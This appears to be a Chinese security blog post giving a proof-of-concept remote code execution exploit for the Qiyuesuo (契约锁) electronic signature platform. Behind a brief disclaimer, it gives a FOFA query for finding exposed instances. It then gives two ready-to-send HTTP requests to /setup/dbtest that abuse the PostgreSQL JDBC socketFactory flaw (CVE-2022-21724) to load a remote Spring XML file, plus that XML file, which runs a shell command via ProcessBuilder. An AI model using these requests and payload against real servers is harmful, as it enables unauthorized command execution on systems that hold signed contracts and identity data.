#  契约锁电子签章系统dbtest RCE  
原创 小白爱学习Sec  小白爱学习Sec   2025-06-18 00:01  
  
**免责声明**  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic&random=0.18042352401019524&random=0.49301784938611526&random=0.7409665131631742 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7L4WY53VhUO2spBG8TGAPF8o98Ac6Y3EPLSEFGmKXeZyQCOGkqFWbeMibTfC1wZLjJTDmLb4Z0P9VCAV3RLDbbQ/640?random=0.11828586430527777&random=0.3266770581654057&random=0.7229092426155448 "")  
  
本文旨在提供有关特定漏洞工具或安全风险的详细信息，以帮助安全研究人员、系统管理员和开发人员更好地理解和修复潜在的安全威胁，协助提高网络安全意识并推动技术进步，而非出于任何恶意目的。利用本文提到的漏洞信息或进行相关测试可能会违反法律法规或服务协议。  
作者不对读者基于本文内容而产生的任何行为或后果承担责任。  
如有任何侵权问题，请联系作者删除。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**简单介绍**  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
契约锁，是上海亘岩网络科技有限公司联合数字证书认证中心、公证处、知名律协一起全力打造的数字化可信基础服务平台；为组织提供“数字身份、电子签章、印章管控以及数据存证服务”于一体的数字化可信基础解决方案。  
  
  
**FOFA：app="契约锁-电子签署平台"**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**漏洞POC**  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
```
GET /setup/dbtest?db=POSTGRESQL&host=localhost&port=5511&username=root&name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2Fxxx.dnslog.cn%2F1%2Exml HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
```  
  
  
可能路径二：  
  
```
GET /api/setup/dbtest?db=POSTGRESQL&host=localhost&port=5511&username=root&name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2Fxxx.dnslog.cn%2F1%2Exml HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/x095A8xUTuX3ricbGViafBNCtD00YzBQGv7cicZF8l1xbfvyljyjic5eU5peQhFfV8sdBGgGRjcRgGy25icTSnAJ1ZA/640?wx_fmt=png&from=appmsg "")  
  
  
  
漏洞利用的是PostgreSQL JDBC Driver RCE（CVE-2022-21724）  
  
  
1.xml的内容如下  
```
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:p="http://www.springframework.org/schema/p"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd">
   <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>/bin/sh</value>
            <value>-c</value>
            <value>touch /tmp/test</value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/x095A8xUTuWMRpvvqmMwKABosFPL6ptacLNz6fxia55bJuCgfYNDtSfiaSIZ9nU9IxDicXfNricwyMTJZUgo9dIgTg/640?wx_fmt=gif&from=appmsg "")  
  
创作不易，点赞、分享、转发支持一下吧！！  
  
  
